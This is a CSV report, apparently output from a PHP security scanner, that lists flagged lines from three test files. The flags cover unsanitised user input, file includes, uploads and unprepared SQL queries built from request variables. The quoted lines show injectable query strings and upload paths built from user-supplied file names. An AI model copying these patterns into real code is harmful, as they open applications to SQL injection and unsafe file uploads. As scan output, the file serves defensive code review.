Fichier,Langage,Ligne,Catégorie,Contenu
../testfile/authcyber.php,php,13,User entry,"$login=$_POST[""login""];"
../testfile/authcyber.php,php,14,User entry,"$mdptmp=explode(""%!"",$_POST[""mdp""]);"
../testfile/authcyber.php,php,20,User entry,"if(isset($_POST[""action""]))"
../testfile/authcyber.php,php,21,User entry,"$action=$_POST[""action""];"
../testfile/authcyber.php,php,23,User entry,"$site=preg_replace('/[^A-Za-z0-9\-\.\@\_]/', '',strip_tags($_POST[""site""]));"
../testfile/authcyber.php,php,34,File manipulation,"include ""/var/www/bdd.php"";"
../testfile/authcyber.php,php,36,Unprepared statement,"$reponse = $bdd->query(""select passwd,CyberboxIdClient from wybotidentifiant WHERE CyberboxIdClient='$loginfinal' AND site='$site' AND actif='1' limit 1"");"
../testfile/authcyber.php,php,59,Unprepared statement,"$reponse2 = $bdd->query(""UPDATE Tokencyberbox SET timestamprenew='$timestamplinux', Token='$uniqueid', site='$site'  WHERE CyberboxIdClient='$idcyber' AND site='$site'"");"
../testfile/authcyber.php,php,72,Unprepared statement,"$reponse2 = $bdd->query(""INSERT INTO Tokencyberbox (CyberboxIdClient,Token,timestamprenew,site) VALUES('$idcyber','$uniqueid','$timestamplinux','$site')"");"
../testfile/authcyber.php,php,83,Unprepared statement,"$reponse2 = $bdd->query(""select Token,timestamprenew from Tokencyberbox WHERE CyberboxIdClient='$idcyber' AND site='$site' limit 1"");"
../testfile/cyber2.php,php,18,User entry,"$site=preg_replace('/[^A-Za-z0-9\-\.\_]/', '',$_GET[""site""]);"
../testfile/cyber2.php,php,19,User entry,"$idclient=preg_replace('/[^A-Za-z0-9\-\.\@\_]/', '',$_GET['idclient']);"
../testfile/cyber2.php,php,20,User entry,"$token=preg_replace('/[^A-Za-z0-9\-\.\_]/', '',$_POST[""token""]);"
../testfile/cyber2.php,php,28,User entry,if(isset($_GET['idclient']) && isset($_GET['site']))
../testfile/cyber2.php,php,30,File manipulation,"include ""/var/www/bdd.php"";"
../testfile/cyber2.php,php,32,Unprepared statement,"$reponse = $bdd->query(""select Token from Tokencyberbox WHERE CyberboxIdClient='$idclient' AND Token='$token' LIMIT 1"");"
../testfile/cyber2.php,php,52,User entry,if(!isset($_FILES['uploadedfile']))
../testfile/cyber2.php,php,58,User entry,"$target_path = $target_path . $ip.""-"".$site.""-"". basename( $_FILES['uploadedfile']['name']).""-$date-$idclient.txt"";"
../testfile/cyber2.php,php,62,User entry,$type=mime_content_type($_FILES['uploadedfile']['tmp_name']);
../testfile/cyber2.php,php,69,User entry,$fileContent = file_get_contents($_FILES['uploadedfile']['tmp_name']);
../testfile/cyber2.php,php,69,File manipulation,$fileContent = file_get_contents($_FILES['uploadedfile']['tmp_name']);
../testfile/cyber2.php,php,92,User entry,"if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path))"
../testfile/cyber2.php,php,94,User entry,"echo ""The file "".  basename( $_FILES['uploadedfile']['name'])."
../testfile/cyber2.php,php,99,User entry,"if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path))"
../testfile/cyber2.php,php,101,User entry,"echo ""The file "".  basename( $_FILES['uploadedfile']['name'])."
../testfile/cyberlgl.php,php,16,User entry,"$site=preg_replace('/[^A-Za-z0-9\-\.\_]/', '',$_GET[""site""]);"
../testfile/cyberlgl.php,php,17,User entry,"$idclient=preg_replace('/[^A-Za-z0-9\-\.\@\_]/', '',$_GET['idclient']);"
../testfile/cyberlgl.php,php,18,User entry,"$token=preg_replace('/[^A-Za-z0-9\-\.\_]/', '',$_POST[""token""]);"
../testfile/cyberlgl.php,php,26,User entry,if(isset($_GET['idclient']) && isset($_GET['site']))
../testfile/cyberlgl.php,php,29,File manipulation,"include ""/var/www/bdd.php"";"
../testfile/cyberlgl.php,php,30,Unprepared statement,"$reponse = $bdd->query(""select Token from Tokencyberbox WHERE CyberboxIdClient='$idclient' AND Token='$token' LIMIT 1"");"
../testfile/cyberlgl.php,php,55,User entry,"$target_path = $target_path . $ip.""-"".$site.""-"". basename( $_FILES['uploadedfile']['name']).""-$date-$idclient.txt"";"
../testfile/cyberlgl.php,php,59,User entry,$type=mime_content_type($_FILES['uploadedfile']['tmp_name']);
../testfile/cyberlgl.php,php,64,User entry,$fileContent = file_get_contents($_FILES['uploadedfile']['tmp_name']);
../testfile/cyberlgl.php,php,64,File manipulation,$fileContent = file_get_contents($_FILES['uploadedfile']['tmp_name']);
../testfile/cyberlgl.php,php,88,User entry,"if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path))"
../testfile/cyberlgl.php,php,90,User entry,"echo ""The file "".  basename( $_FILES['uploadedfile']['name'])."
../testfile/cyberlgl.php,php,95,User entry,"if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path))"
